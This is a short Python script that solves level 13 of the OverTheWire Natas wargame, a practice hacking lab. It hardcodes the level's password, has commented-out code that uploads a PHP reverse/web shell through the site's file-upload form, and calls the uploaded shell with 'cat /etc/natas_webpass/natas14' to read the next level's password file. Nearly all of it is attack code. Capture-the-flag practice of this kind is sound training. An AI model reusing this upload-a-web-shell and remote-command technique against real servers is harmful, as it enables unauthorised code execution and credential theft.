#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.post(url, files={"uploadedfile": open('revshell14.php',
#                                                         'rb')},
#                        data={"filename": "revshell14.php", "MAX_FILE_SIZE":
#                              "1000"}, auth=(username, password))

response = session.get(
    url + 'upload/wkbnbg4rw5.php?c=cat /etc/natas_webpass/natas14', auth=(username, password))
content = response.text
print(content)
